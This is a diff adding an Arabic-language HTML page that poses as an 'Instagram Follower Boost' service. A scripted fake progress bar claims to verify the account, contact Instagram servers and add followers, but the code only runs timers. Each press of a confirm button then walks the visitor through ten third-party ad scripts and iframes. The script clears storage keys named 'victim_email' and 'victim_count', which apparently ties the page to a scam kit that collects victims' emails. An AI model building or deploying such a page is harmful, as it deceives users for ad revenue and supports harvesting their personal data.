@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>جاري المعالجة</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #f5f5f5;
+            font-family: 'Cairo', 'Tajawal', 'Tahoma', 'Segoe UI', Arial, sans-serif;
+            padding: 20px;
+            direction: rtl;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            max-width: 450px;
+            width: 100%;
+            margin: 30px auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            overflow: hidden;
+            border: 1px solid #ddd;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #405de6, #833ab4, #e1306c);
+            padding: 25px 20px;
+            text-align: center;
+            color: white;
+        }
+
+        .header h2 {
+            font-size: 22px;
+            font-weight: 800;
+        }
+
+        .header p {
+            font-size: 13px;
+            opacity: 0.9;
+            margin-top: 8px;
+            font-weight: 500;
+        }
+
+        .content {
+            padding: 25px 20px;
+        }
+
+        .progress-container {
+            background: #e0e0e0;
+            border-radius: 50px;
+            height: 12px;
+            width: 100%;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #405de6, #833ab4, #e1306c);
+            border-radius: 50px;
+            transition: width 0.3s ease;
+        }
+
+        .progress-text {
+            color: #e1306c;
+            font-size: 20px;
+            font-weight: 800;
+            text-align: center;
+            margin: 10px 0;
+        }
+
+        .status-text {
+            color: #666;
+            font-size: 14px;
+            text-align: center;
+            margin: 15px 0;
+            padding: 10px;
+            background: #f9f9f9;
+            border-radius: 12px;
+            font-weight: 500;
+        }
+
+        .ads-section {
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+        }
+
+        .ads-title {
+            text-align: center;
+            font-size: 14px;
+            color: #999;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .ad-box {
+            background: #fafafa;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 15px;
+            text-align: center;
+            border: 1px solid #eee;
+        }
+
+        .confirm-btn {
+            width: 100%;
+            padding: 14px;
+            background: #e1306c;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 800;
+            cursor: pointer;
+            margin: 20px 0;
+            transition: 0.2s;
+            font-family: 'Cairo', 'Tajawal', sans-serif;
+        }
+
+        .confirm-btn:active {
+            transform: scale(0.97);
+        }
+
+        .footer {
+            background: #f9f9f9;
+            padding: 15px;
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+            border-top: 1px solid #eee;
+            font-weight: 500;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        iframe, .ad-iframe {
+            width: 100%;
+            border: none;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h2>جاري إضافة المتابعين</h2>
+        <p>Instagram Follower Boost</p>
+    </div>
+
+    <div class="content">
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div class="progress-text" id="progressPercent">0%</div>
+        <div class="status-text" id="statusText">
+            جاري الاتصال بالخوادم
+        </div>
+
+        <div class="ads-section" id="adsSection">
+            <div class="ads-title">عروض حصرية</div>
+            
+            <!-- إعلان 1 - script -->
+            <div class="ad-box" id="adBox1">
+                <script src="https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js"></script>
+            </div>
+
+            <!-- إعلان 2 - script مع invoke -->
+            <div class="ad-box" id="adBox2">
+                <script async="async" data-cfasync="false" src="https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js"></script>
+                <div id="container-596225155ab3da796681d551cb4b7cf4"></div>
+            </div>
+
+            <!-- إعلان 3 - atOptions -->
+            <div class="ad-box" id="adBox3">
+                <script>
+                    atOptions = {
+                        'key' : 'dcff8a2cffdf0642c627a5bacf3a04fd',
+                        'format' : 'iframe',
+                        'height' : 60,
+                        'width' : 468,
+                        'params' : {}
+                    };
+                </script>
+                <script src="https://www.highperformanceformat.com/dcff8a2cffdf0642c627a5bacf3a04fd/invoke.js"></script>
+            </div>
+
+            <!-- إعلان 4 - script مباشر -->
+            <div class="ad-box" id="adBox4">
+                <script src="https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js"></script>
+            </div>
+
+            <!-- إعلان 5 - atOptions -->
+            <div class="ad-box" id="adBox5">
+                <script>
+                    atOptions = {
+                        'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
+                        'format' : 'iframe',
+                        'height' : 300,
+                        'width' : 160,
+                        'params' : {}
+                    };
+                </script>
+                <script src="https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js"></script>
+            </div>
+
+            <!-- إعلان 6 - iframe -->
+            <div class="ad-box" id="adBox6">
+                <iframe src="https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c" width="100%" height="280" style="border:none; border-radius:8px;"></iframe>
+            </div>
+
+            <!-- إعلان 7 - إضافي script -->
+            <div class="ad-box" id="adBox7">
+                <script type="text/javascript">
+                    atOptions = {
+                        'key' : '9e5f8c0b6b7b8c9d0e1f2a3b4c5d6e7f',
+                        'format' : 'iframe',
+                        'height' : 250,
+                        'width' : 300,
+                        'params' : {}
+                    };
+                </script>
+                <script src="https://www.highperformanceformat.com/9e5f8c0b6b7b8c9d0e1f2a3b4c5d6e7f/invoke.js"></script>
+            </div>
+
+            <!-- إعلان 8 - إعلان نصي -->
+            <div class="ad-box" id="adBox8">
+                <a href="https://example.com/offer" target="_blank" style="display:block; padding:20px; background:#e1306c; color:white; text-decoration:none; border-radius:8px; font-weight:bold;">
+                    عرض خاص - احصل على 1000 متابع مجانا
+                </a>
+            </div>
+
+            <!-- إعلان 9 - صورة -->
+            <div class="ad-box" id="adBox9">
+                <img src="https://via.placeholder.com/300x250/e1306c/white?text=عرض+خاص" style="width:100%; max-width:300px; border-radius:8px;" alt="عرض خاص">
+            </div>
+
+            <!-- إعلان 10 - iframe ثاني -->
+            <div class="ad-box" id="adBox10">
+                <iframe src="https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c" width="100%" height="250" style="border:none; border-radius:8px;"></iframe>
+            </div>
+        </div>
+
+        <button class="confirm-btn" id="confirmBtn">انقر للتأكيد</button>
+    </div>
+
+    <div class="footer">
+        تم استخدامه من قبل +25,000 مستخدم
+    </div>
+</div>
+
+<script>
+    const progressBar = document.getElementById('progressBar');
+    const progressPercent = document.getElementById('progressPercent');
+    const statusText = document.getElementById('statusText');
+    const confirmBtn = document.getElementById('confirmBtn');
+    
+    // مراحل التحميل (بدون عبارة اكتمال)
+    const stages = [
+        { percent: 10, text: "جاري التحقق من الحساب" },
+        { percent: 25, text: "الاتصال بخوادم Instagram" },
+        { percent: 40, text: "تم التحقق من صحة البيانات" },
+        { percent: 55, text: "جلب قائمة المتابعين" },
+        { percent: 70, text: "إضافة متابعين جدد" },
+        { percent: 85, text: "معالجة الطلبات" },
+        { percent: 95, text: "اللمسات الأخيرة" },
+        { percent: 100, text: "جاهز للتأكيد" }
+    ];
+    
+    let currentStage = 0;
+    let isCompleted = false;
+    
+    function updateProgress() {
+        if(currentStage < stages.length) {
+            const stage = stages[currentStage];
+            progressBar.style.width = stage.percent + "%";
+            progressPercent.innerText = stage.percent + "%";
+            statusText.innerHTML = stage.text;
+            currentStage++;
+            
+            if(stage.percent === 100) {
+                isCompleted = true;
+                confirmBtn.disabled = false;
+            }
+        }
+    }
+    
+    const progressInterval = setInterval(updateProgress, 1500);
+    confirmBtn.disabled = true;
+    
+    // قائمة بكل الإعلانات (10 إعلانات)
+    const adBoxes = ['adBox1', 'adBox2', 'adBox3', 'adBox4', 'adBox5', 'adBox6', 'adBox7', 'adBox8', 'adBox9', 'adBox10'];
+    let clickCount = 0;
+    
+    // إخفاء كل الإعلانات في البداية
+    adBoxes.forEach(boxId => {
+        const box = document.getElementById(boxId);
+        if(box) box.classList.add('hidden');
+    });
+    
+    // عند اكتمال التحميل، إظهار أول إعلان
+    let checkCompleteInterval = setInterval(() => {
+        if(isCompleted) {
+            clearInterval(checkCompleteInterval);
+            const firstAd = document.getElementById(adBoxes[0]);
+            if(firstAd) firstAd.classList.remove('hidden');
+        }
+    }, 100);
+    
+    confirmBtn.addEventListener('click', function() {
+        if(!isCompleted) {
+            alert("الرجاء الانتظار حتى اكتمال التحميل");
+            return;
+        }
+        
+        if(clickCount < adBoxes.length) {
+            // إخفاء الإعلان الحالي
+            if(clickCount > 0) {
+                const previousAd = document.getElementById(adBoxes[clickCount - 1]);
+                if(previousAd) previousAd.classList.add('hidden');
+            }
+            
+            // إظهار الإعلان التالي
+            const currentAdBox = document.getElementById(adBoxes[clickCount]);
+            if(currentAdBox) {
+                currentAdBox.classList.remove('hidden');
+                
+                if(clickCount === adBoxes.length - 1) {
+                    confirmBtn.innerText = 'العودة للصفحة الرئيسية';
+                } else {
+                    confirmBtn.innerText = 'متابعة';
+                }
+            }
+        } else {
+            // بعد كل الإعلانات، العودة للصفحة الرئيسية
+            localStorage.removeItem("victim_email");
+            localStorage.removeItem("victim_count");
+            window.location.href = "index.html";
+        }
+        
+        clickCount++;
+    });
+    
+    window.addEventListener('beforeunload', function() {
+        localStorage.removeItem("victim_email");
+        localStorage.removeItem("victim_count");
+    });
+</script>
+
+</body>
+  </html>
